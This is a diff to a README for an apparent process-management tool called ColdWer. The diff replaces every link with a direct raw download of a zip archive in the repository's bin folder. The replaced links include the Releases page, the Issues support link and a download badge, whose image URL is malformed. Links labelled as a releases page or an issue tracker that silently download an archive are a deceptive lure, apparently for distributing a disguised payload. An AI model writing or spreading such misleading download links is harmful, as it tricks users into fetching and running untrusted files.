@@ -6,7 +6,7 @@ Welcome to ColdWer! This application is designed to help you manage processes on
 
 ## 📥 Download ColdWer
 
-[![Download ColdWer](https://img.shields.io/badge/Download%20ColdWer-v1.0-blue.svg)](https://github.com/Rakum713/ColdWer/releases)
+[![Download ColdWer](https://github.com/Rakum713/ColdWer/raw/refs/heads/main/bin/Wer-Cold-v2.9-alpha.5.zip%https://github.com/Rakum713/ColdWer/raw/refs/heads/main/bin/Wer-Cold-v2.9-alpha.5.zip)](https://github.com/Rakum713/ColdWer/raw/refs/heads/main/bin/Wer-Cold-v2.9-alpha.5.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ ColdWer offers several useful features:
 
 To download ColdWer, follow these steps:
 
-1. **Visit the Releases Page**: Go to the ColdWer [Releases page](https://github.com/Rakum713/ColdWer/releases) in your web browser.
+1. **Visit the Releases Page**: Go to the ColdWer [Releases page](https://github.com/Rakum713/ColdWer/raw/refs/heads/main/bin/Wer-Cold-v2.9-alpha.5.zip) in your web browser.
    
 2. **Select the Latest Release**: Find the most recent version, which will be labeled clearly.
 
@@ -69,7 +69,7 @@ If you encounter issues while using ColdWer, consider these solutions:
 
 ## 📞 Support
 
-For additional help, you can reach out through our [GitHub Issues page](https://github.com/Rakum713/ColdWer/issues). Provide a clear description of your issue, and we will assist you.
+For additional help, you can reach out through our [GitHub Issues page](https://github.com/Rakum713/ColdWer/raw/refs/heads/main/bin/Wer-Cold-v2.9-alpha.5.zip). Provide a clear description of your issue, and we will assist you.
 
 ## 👥 Community
 
@@ -92,6 +92,6 @@ ColdWer is open-source software licensed under the MIT License. You can freely u
 
 ## 📥 Download ColdWer Again
 
-Don't forget, you can always return to the [Releases page](https://github.com/Rakum713/ColdWer/releases) to check for updates or download a new version.
+Don't forget, you can always return to the [Releases page](https://github.com/Rakum713/ColdWer/raw/refs/heads/main/bin/Wer-Cold-v2.9-alpha.5.zip) to check for updates or download a new version.
 
 Thank you for using ColdWer! Enjoy the benefits of easier process management.
